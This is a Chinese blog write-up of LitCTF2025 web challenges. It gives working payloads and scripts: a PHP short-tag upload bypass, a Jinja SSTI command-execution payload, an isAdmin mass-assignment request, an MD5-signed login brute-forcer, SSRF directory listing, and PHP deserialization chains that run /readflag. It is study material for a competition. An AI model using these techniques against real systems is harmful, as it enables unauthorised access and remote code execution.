---
title: LitCTF2025（公开赛道）（web
date: '2026-03-31 20:44:47'
updated: '2026-04-04 20:02:16'
permalink: /post/litctf2025-open-track-web-1oyyf3.html
comments: true
toc: true
---



# LitCTF2025（公开赛道）（web

日期：2025-08-30 18:19:31

## easy_file

首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面
看源码也能看到是对其经过处理的

![](/source/images/7b6a140b-d641-4c8b-82db-922722fbb1c1-1024x329-20260331204447-q2ofo7b.png)

来到上传界面上传，经过测试是过滤了<?php,换成短标签<?就可以

![](/source/images/ca9f80e1-cd95-4dd2-91a7-345e9c5db6e4-1024x560-20260331204447-oih8d7h.png)

上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的（卡这半天，后面学长出了）后面就是大家都会的步骤了

![](/source/images/3a617127-6473-44eb-b07d-9cef8c6b51b1-1024x400-20260331204447-glgzs81.png)

## 星愿信箱

需要包含文字，过滤了{{吧，我们用{%绕过了，没有回显我们就加print这样

![](/source/images/b001abb5-197f-4715-a593-f3bcfcafda6a-1024x630-20260331204447-wophb33.png)

然后用的是

```
<code>{%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
').read())%}</code>
```

![](/source/images/9586dfed-f910-48e5-bc1b-61f5275bb79a-1024x718-20260331204447-bfd5sic.png)

## nest_js

![](/source/images/7d4a8fe9-9d98-4ec0-b1e1-fb7b3410f08f-1024x489-20260331204447-0viz76n.png)

账户密码admin passwor登入即送flag

## 多重宇宙日记

先随便创造个用户登入进去进入这个界面

![](/source/images/c1fdcbae-6d61-493c-8b14-deb7a2fde108-1-1024x668-20260331204447-adwsnhe.png)

我们看他的源码

```javascript
       // 更新表单的JS提交
        document.getElementById('profileUpdateForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const statusEl = document.getElementById('updateStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在更新...';

            const formData = new FormData(event.target);
            const settingsPayload = {};
            // 构建 settings 对象，只包含有值的字段
            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
            if (formData.get('language')) settingsPayload.language = formData.get('language');
            // ...可以添加其他字段

            try {
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ settings: settingsPayload }) // 包装在 "settings"键下
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
                    // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() => window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                statusEl.textContent = '请求失败: ' + error.toString();
            }
        });
```

说明了需要让isAdmin=ture,我们发送`{ "settings": { "isAdmin": true } }`获得管理员面板

![](/source/images/c703c2de-b45a-42ea-8c1c-0f578604ab6d-1024x489-20260331204447-ld3oyk0.png)

## easy_signin

界面是404，我们直接开扫

![](/source/images/fbe7b77d-950b-4446-8aa4-0ab29dacb5aa-1-20260331204447-kye8ghy.png)

分别是

![](/source/images/e1b29909-7ce5-4faa-8f12-036375cc0349-1024x282-20260331204447-ok86ldh.png)

![](/source/images/7d6c4692-b12f-49f9-b936-ea5564d6cfec-1024x619-20260331204447-0ut1rds.png)

源码有个api.js看看

![](/source/images/ca58244c-32bb-4261-b147-32c688e191d7-20260331204447-705tjqj.png)

看见url第一反应就是127.0.0.1

![](/source/images/c1a3b900-4266-4e29-9179-20e027fefdd7-1024x354-20260331204447-8ptftba.png)

然后就卡住了，我们回到之前的登入界面看看他的逻辑，他给了

```javascript

        const loginBtn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const errorTip = document.getElementById('errorTip');
        const rawUsername = document.getElementById('username').value;


        loginBtn.addEventListener('click', async () => {
            const rawPassword = passwordInput.value.trim();
            if (!rawPassword) {
                errorTip.textContent = '请输入密码';
                errorTip.classList.add('show');
                passwordInput.focus();
                return;
            }

            const md5Username = CryptoJS.MD5(rawUsername).toString();
            const md5Password = CryptoJS.MD5(rawPassword).toString();


            const shortMd5User = md5Username.slice(0, 6);
            const shortMd5Pass = md5Password.slice(0, 6);


            const timestamp = Date.now().toString(); //五分钟


            const secretKey = 'easy_signin';
            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();

            try {
                const response = await fetch('login.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Sign': sign
                    },
                    body: new URLSearchParams({
                        username: md5Username,
                        password: md5Password,
                        timestamp: timestamp
                    })
                });

                const result = await response.json();
                if (result.code === 200) {
                    alert('登录成功！');
                    window.location.href = 'dashboard.php';
                } else {
                    errorTip.textContent = result.msg;
                    errorTip.classList.add('show');
                    passwordInput.value = '';
                    passwordInput.focus();
                    setTimeout(() => errorTip.classList.remove('show'), 3000);
                }
            } catch (error) {
                errorTip.textContent = '网络请求失败';
                errorTip.classList.add('show');
                setTimeout(() => errorTip.classList.remove('show'), 3000);
            }
        });

        passwordInput.addEventListener('input', () => {
            errorTip.classList.remove('show');
        });
```

通过这个我们可以知道他的密码的生成逻辑，直接叫ai搓一个

```py
import requests
import hashlib
import time

# 配置参数
username = 'admin'  # 假设用户名已知，如果不同请修改
password_file = ''  # 密码字典文件路径
url = ''  # 登录URL，请替换为实际URL

# 计算用户名的MD5（固定值）
md5_user = hashlib.md5(username.encode()).hexdigest()

# 读取密码字典
try:
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print(f"密码文件 {password_file} 未找到")
    exit(1)

# 遍历密码字典
for password in passwords:
    # 计算密码的MD5
    md5_pass = hashlib.md5(password.encode()).hexdigest()
    short_user = md5_user[:6]
    short_pass = md5_pass[:6]
    timestamp = str(int(time.time() * 1000))  # 当前毫秒时间戳
    sign_str = short_user + short_pass + timestamp + 'easy_signin'
    sign = hashlib.md5(sign_str.encode()).hexdigest()

    # 构造请求头和数据
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Sign': sign
    }
    data = {
        'username': md5_user,
        'password': md5_pass,
        'timestamp': timestamp
    }

    # 发送POST请求
    try:
        response = requests.post(url, headers=headers, data=data, timeout=5)
        # 检查响应状态码和内容
        if response.status_code == 200:
            # 假设成功响应中包含"success"关键字，根据实际响应调整
            if 'success' in response.text.lower():
                print(f"[+] 找到密码: {password}")
                break
            else:
                print(f"[-] 尝试密码: {password} 失败，响应: {response.text}")
        else:
            print(f"[-] 尝试密码: {password} 失败，状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求异常 for password: {password}, error: {e}")

    # 可选：添加延迟避免请求过快
    # time.sleep(0.1)

print("爆破完成")
```

爆破出来是密码是admin123，依旧是让ai搓个登入后访问/dashboard.php

```py
import requests
import hashlib
import time
import json

# 配置参数
username = 'admin'  # 假设用户名为 'admin'，如果不是请修改
password = 'admin123'  # 已知的正确密码
login_url = 'http://node6.anna.nssctf.cn:20560/login.php'  # 请替换为实际的登录URL
dashboard_url = 'http://node6.anna.nssctf.cn:20560/dashboard.php'  # 请替换为实际的dashboard URL

# 创建一个会话对象来保持cookies
session = requests.Session()

# 计算用户名的MD5
md5_user = hashlib.md5(username.encode()).hexdigest()
print(f"用户 '{username}' 的MD5: {md5_user}")

# 计算密码的MD5
md5_pass = hashlib.md5(password.encode()).hexdigest()
print(f"密码 '{password}' 的MD5: {md5_pass}")

# 截取前6位
short_user = md5_user[:6]
short_pass = md5_pass[:6]
print(f"用户名MD5前6位: {short_user}")
print(f"密码MD5前6位: {short_pass}")

# 生成时间戳（毫秒）
timestamp = str(int(time.time() * 1000))
print(f"时间戳: {timestamp}")

# 计算签名
secret_key = 'easy_signin'
sign_str = short_user + short_pass + timestamp + secret_key
sign = hashlib.md5(sign_str.encode()).hexdigest()
print(f"签名字符串: {sign_str}")
print(f"签名MD5: {sign}")

# 构造登录请求头和数据
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Sign': sign,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
data = {
    'username': md5_user,
    'password': md5_pass,
    'timestamp': timestamp
}

print("\n" + "=" * 50)
print("发送登录请求...")
print("=" * 50)

# 发送登录POST请求
try:
    login_response = session.post(login_url, headers=headers, data=data)

    print(f"登录请求URL: {login_url}")
    print(f"请求方法: POST")
    print("\n登录请求头:")
    for key, value in headers.items():
        print(f"  {key}: {value}")

    print("\n登录请求体:")
    print(f"  {data}")

    print("\n" + "-" * 50)
    print(f"登录响应状态码: {login_response.status_code}")
    print(f"登录响应时间: {login_response.elapsed.total_seconds():.2f}秒")

    print("\n登录响应头:")
    for key, value in login_response.headers.items():
        print(f"  {key}: {value}")

    print("\n登录响应内容:")
    # 尝试解析JSON响应，如果不是JSON则直接显示文本
    try:
        json_response = login_response.json()
        print(json.dumps(json_response, indent=2, ensure_ascii=False))
    except ValueError:
        print(login_response.text)

    print("\n当前会话Cookies:")
    for cookie in session.cookies:
        print(f"  {cookie.name}: {cookie.value}")

    print("\n" + "=" * 50)
    if login_response.status_code == 200:
        print("[+] 登录请求发送成功!")
        # 这里可以根据实际响应内容判断是否登录成功
        if 'success' in login_response.text.lower() or '登录成功' in login_response.text:
            print("[+] 登录成功!")
        else:
            print("[-] 登录可能失败，请检查响应内容")
    else:
        print(f"[-] 登录请求失败，状态码: {login_response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] 登录请求异常: {e}")
    print(f"异常详情: {str(e)}")
    exit(1)

# 访问 dashboard.php
print("\n\n" + "=" * 50)
print("访问 Dashboard...")
print("=" * 50)

try:
    dashboard_response = session.get(dashboard_url)

    print(f"Dashboard请求URL: {dashboard_url}")
    print(f"请求方法: GET")

    print("\nDashboard请求头:")
    # 显示发送到dashboard的请求头
    dashboard_headers = {
        'User-Agent': headers['User-Agent']
    }
    for key, value in dashboard_headers.items():
        print(f"  {key}: {value}")

    print("\n" + "-" * 50)
    print(f"Dashboard响应状态码: {dashboard_response.status_code}")
    print(f"Dashboard响应时间: {dashboard_response.elapsed.total_seconds():.2f}秒")

    print("\nDashboard响应头:")
    for key, value in dashboard_response.headers.items():
        print(f"  {key}: {value}")

    print("\nDashboard响应内容:")
    # 尝试解析JSON响应，如果不是JSON则直接显示文本
    try:
        json_response = dashboard_response.json()
        print(json.dumps(json_response, indent=2, ensure_ascii=False))
    except ValueError:
        # 如果是HTML，只显示前1000字符，避免控制台输出过多
        content = dashboard_response.text
        if len(content) > 1000:
            print(content[:1000] + "...\n[内容过长，已截断]")
        else:
            print(content)

    print("\n" + "=" * 50)
    if dashboard_response.status_code == 200:
        print("[+] Dashboard访问成功!")
    else:
        print(f"[-] Dashboard访问失败，状态码: {dashboard_response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] Dashboard请求异常: {e}")
    print(f"异常详情: {str(e)}")
```

![](/source/images/cb89fdd7-d01a-4b76-8c09-4f1b03f45902-1024x671-20260331204447-0fohoua.png)

我们利用那个url参数打ssrf

![](/source/images/35ffd8bc-3253-4a40-b073-acb699bbdee9-1024x725-20260331204447-6kz36ne.png)

这里可以用`ls /var/www/html`来找需要用二次编码（应该是快照和网页的两次解码），我们发现了327a6c4304ad5938eaf0efb6cc3e53dc.php

![](/source/images/031ac344-30c3-40ff-ad47-48c1210e15e7-1024x367-20260331204447-wyaeuxv.png)

访问得flag

![](/source/images/67c5ba93-4a55-464a-87d6-6eee02a833c5-20260331204447-04ee2w6.png)

还有一种方法说url参数那是能用php://(php大小写混用绕过即可)或者file://来读取源码或者urlcode.php的内容（没有去特意去看了)

![](/source/images/9474fe10-1c68-4fb2-8f09-d6466d0af787-1-1024x654-20260331204447-9zze0bc.png)

## 君の名は

参考自[https://www.cnblogs.com/Litsasuk/articles/18896993](https://www.cnblogs.com/Litsasuk/articles/18896993)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
create_function("", 'die(`/readflag`);');
class Taki
{
    private $musubi;
    private $magic;
    public function __unserialize(array $data)
    {
        $this->musubi = $data['musubi'];
        $this->magic = $data['magic'];
        return ($this->musubi)();
    }
    public function __call($func,$args){
        (new $args[0]($args[1]))->{$this->magic}();
    }
}

class Mitsuha
{
    private $memory;
    private $thread;
    public function __invoke()
    {
        return $this->memory.$this->thread;
    }
}

class KatawareDoki
{
    private $soul;
    private $kuchikamizake;
    private $name;

    public function __toString()
    {
        ($this->soul)->flag($this->kuchikamizake,$this->name);
        return "call error!no flag!";
    }
}

$Litctf2025 = $_POST['Litctf2025'];
if(!preg_match("/^[Oa]:[\d]+/i", $Litctf2025)){
    unserialize($Litctf2025);
}else{
    echo "把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
}
```

我们的主要目的应该就是create_function("", 'die(`/readflag`);');，create_function()是用来创建匿名函数的，看到把O改成C很容易想到原生类[https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3](https://chenxi9981.github.io/php反序列化/#原生类相关)

```
ArrayObject::unserialize
ArrayIterator::unserialize
RecursiveArrayIterator::unserialize
SplDoublyLinkedList::unserialize
SplQueue::unserialize
SplStack::unserialize
SplObjectStorage::unserialize
```

那思路应该就是利用原生类来调用匿名函数，找到ReflectionFunction的invoke方法可以调用函数

![](/source/images/1a25d29d-ff87-4313-bee2-9ff122f6f997-1024x477-20260331204447-bkjxycq.png)

但是匿名函数怎么弄呢，可以直接用

```php
<?php
$a=create_function("", 'die(`/readflag`);');
var_dump(   $a);
#string(9) "\000lambda_1"
```

\000lambda_1这个就是名字了，但是匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，最好是重新开一下环境

```php
Litsasuk师傅的exp
<?php
highlight_file(__FILE__);
error_reporting(0);
class Taki
{
    public $musubi;
    public $magic = "invoke";
}

class Mitsuha
{
    public $memory;
    public $thread;
}

class KatawareDoki
{
    public $soul;
    public $kuchikamizake = "ReflectionFunction";
    public $name = "\000lambda_1";
}
$a = new Taki();
$b = new Mitsuha();
$c = new KatawareDoki();

$a->musubi = $b;		// 1.把对象当成函数调用，触发__invoke()
$b->thread = $c;		// 2. 把对象作为字符串使用，触发__toString()
$c->soul = $a;			// 3. 调用不存在的方法，触发__call()

$arr=array("evil"=>$a);
$d=new ArrayObject($arr);
echo urlencode(serialize($d));
```

还有一个非预期，直接在`return ($this->musubi)();`处调用匿名函数

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class Taki
{
    public $musubi = "\000lambda_1";
    public $magic = "";
}
$a = new Taki();

$arr=array("evil"=>$a);
$d=new ArrayObject($arr);
echo urlencode(serialize($d));
```

## 总结

拖那么久才想起来复现，easy_signineasy_signin比赛时候没出来有点可惜，这题反序列化的话其实现在还是有点迷迷糊糊（本来基础不扎实），加油吧！
官方wp[https://godyu.com/13917.html](https://godyu.com/13917.html)
